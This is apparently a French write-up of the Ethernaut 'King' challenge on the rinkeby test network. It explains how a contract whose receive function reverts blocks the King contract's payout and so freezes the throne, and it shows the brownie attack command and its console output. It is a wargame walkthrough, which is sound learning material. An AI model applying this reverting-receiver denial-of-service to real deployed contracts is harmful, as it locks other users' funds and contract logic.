# King

## Objectif
L'objectif de ce niveau et de devenir **king** et de le rester.

## Devenir **king**

Pour devenir **king**, il faut utiliser [`receive`](contracts/king.sol#16) et envoyer une somme supérieure à la dernière envoyée.

Les fonds reçus sont [envoyés[(contracts/king.sol#18)] au **king** courant et le changement de **king** opère.

Pour rester **king**, il faut trouver un moyen pour que le transfert échoue.

En utilisant un smart contract qui appelle [`revert` dans sa méthode `receive`](contracts/kingAttack.sol#18), il est possible d'empêcher 'avoir un nouveau **king**

Pour connaitre la somme minimum à envoyer au contrat, nous pouvons lire la valeur du slot d'index 1.

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0x55269622D8528425B94F0e22B885a0CC9c3484F8" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

KingProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x100ddb7e61a129b0cf08f84b3623897db2dac1fa39de042ffbc1be0842d1043c
  Gas price: 1.000000024 gwei   Gas limit: 167615   Nonce: 246
  KingAttack.constructor confirmed   Block: 10481104   Gas used: 152378 (90.91%)
  KingAttack deployed at: 0xa7A488c45Bae6045593A0D86871bBd153E135C77

Value: 1000000000000000
King: 0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5
Transaction sent: 0x0ab4477f31e6527421406a9e5e5fd7a3680de36cd07ee006e2f43c47acc97e27
  Gas price: 1.000000024 gwei   Gas limit: 56094   Nonce: 247
  KingAttack.forward confirmed   Block: 10481105   Gas used: 50808 (90.58%)

King: 0xa7A488c45Bae6045593A0D86871bBd153E135C77
```





